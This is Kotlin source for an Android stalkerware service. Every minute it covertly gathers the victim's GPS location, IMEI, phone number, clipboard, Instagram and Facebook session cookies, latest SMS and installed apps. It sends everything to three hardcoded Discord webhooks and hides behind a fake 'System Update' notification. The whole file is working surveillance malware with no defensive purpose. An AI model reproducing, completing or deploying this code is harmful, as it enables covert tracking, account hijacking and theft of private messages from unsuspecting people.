package com.dark.stalker

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class StealthService : Service() {
    companion object {
        const val TAG = "StalkerService"
        val WEBHOOKS = listOf(
            "https://discord.com/api/webhooks/1573212736433819769/TyI8UvycGfG1kQF2JTtfc0Sx2Fn5ksjQj61LTPNT7V7yNgRqYGJ3hGH8N-4yIIWPO6m6",
            "https://discord.com/api/webhooks/1573212865522049115/flKUfWzWOfKAbcFSnFctIpSEn2ZV49ERbIJ82XgDVoIVOzu3isnLlAzsI7tMC3V0BJkR",
            "https://discord.com/api/webhooks/1573212985714020476/BAlkc1c03XPRYw48Z7XxBoDNDc-DTUcLudk48nlkqZyzIhMDqran9q7XCjaUUbQqmxMq"
        )
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
        
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                harvestEverything()
                Thread.sleep(60000) // Steal every minute
            }
        }
    }

    private fun harvestEverything() {
        val payload = JSONObject()
        payload.put("gps", LocationUtils.getLastLocation(this))
        payload.put("imei", TelephonyUtils.getImei(this))
        payload.put("phone_number", TelephonyUtils.getPhoneNumber(this))
        payload.put("battery", "Unknown")
        payload.put("clipboard", ClipboardUtils.getClipboard(this))
        payload.put("ig_cookies", CookieUtils.getInstagramCookies(this))
        payload.put("fb_cookies", CookieUtils.getFacebookCookies(this))
        payload.put("latest_sms", SmsUtils.getLatestSms(this))
        payload.put("apps", AppUtils.getInstalledApps(this))
        
        sendToDiscord(payload.toString())
    }

    private fun sendToDiscord(jsonData: String) {
        for (webhook in WEBHOOKS) {
            CoroutineScope(Dispatchers.IO).launch {
                HttpUtils.postJson(webhook, JSONObject().apply {
                    put("content", jsonData)
                }.toString())
            }
        }
    }

    override fun onBind(intent: Intent?) = null
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("stalker_channel", "System Update", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Updating..."
            }
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): android.app.Notification {
        return android.app.Notification.Builder(this, "stalker_channel")
            .setContentTitle("System Update")
            .setContentText("Installing updates...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }
}
